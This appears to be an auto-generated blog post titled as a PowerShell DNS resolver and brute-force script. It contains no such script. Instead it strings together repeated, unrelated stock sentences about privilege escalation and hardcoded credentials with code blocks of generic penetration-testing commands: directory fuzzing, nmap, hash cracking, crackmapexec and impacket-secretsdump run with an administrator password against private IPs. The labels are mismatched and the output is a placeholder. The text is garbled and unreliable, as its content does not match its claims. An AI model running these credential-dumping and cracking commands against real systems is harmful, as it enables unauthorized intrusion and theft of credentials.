---
TitleSEO: "DNS Resolver and Brute Forcer in PowerShell | ZureFX"
TitlePost: "DNS Resolver and Brute Forcer — PowerShell"
Author: "ZureFX"
Description: "A PowerShell script for dns resolver and brute forcer. Built for security research and automation."
Keywords: "bash, python, c, parser, tool, powershell"
URL: "https://zurefx.github.io/scripting/script-dns-resolver-and-brute-forcer-373.html"
URL_IMAGES: ""
Date: "2024-05-19"
Tags: "Bash, Python, C, Parser, Tool, PowerShell"
Section: "scripting"
Lang: "en"
main_img: "script-dns-resolver-and-brute-forcer-373"
Permalink: "/scripting/script-dns-resolver-and-brute-forcer-373.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

Group Policy Preferences contained encrypted but recoverable credentials. The target system was identified as running a vulnerable version of the service. Network traffic analysis revealed unencrypted communications containing user credentials.

Built with **PowerShell** for offensive security automation.

### Requirements

- PowerShell
- `ligolo-ng`
- `ffuf`
- `burpsuite`

## Implementation

### Core Logic

The scheduled task ran with elevated privileges and could be abused for escalation. The database credentials were hardcoded in the application source code.

```powershell
feroxbuster -h
gobuster dir -u http://10.39.120.186/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Authentication bypass was achieved through careful manipulation of the login mechanism. The database credentials were hardcoded in the application source code.

### Helper Functions

The database credentials were hardcoded in the application source code. The scheduled task ran with elevated privileges and could be abused for escalation.

```powershell
feroxbuster -h
nmap -sCV -p389,80,25 10.62.143.59 -oN scan.txt
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.22.186.177/FUZZ
crackmapexec smb 10.91.198.58 -u administrator -p 'P@ssw0rd!' --shares
```

## Usage

### Basic Usage

Command injection was possible through unsanitized user input in the search functionality. The service was running without proper input validation, leading to injection vulnerabilities.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.72.136.235
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

### Advanced Options

The kernel version was outdated and vulnerable to a publicly known exploit. The target system was identified as running a vulnerable version of the service. Token impersonation allowed elevation to SYSTEM privileges on the target.

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.107.222.186/FUZZ
impacket-secretsdump administrator:'P@ssw0rd!'@10.74.207.212
```

## Output

### Example Output

The scheduled task ran with elevated privileges and could be abused for escalation. Privilege escalation was possible due to misconfigured sudo permissions.

```
[+] Scanning target...
[+] Found 10 results
[+] Done in 4.00s
```
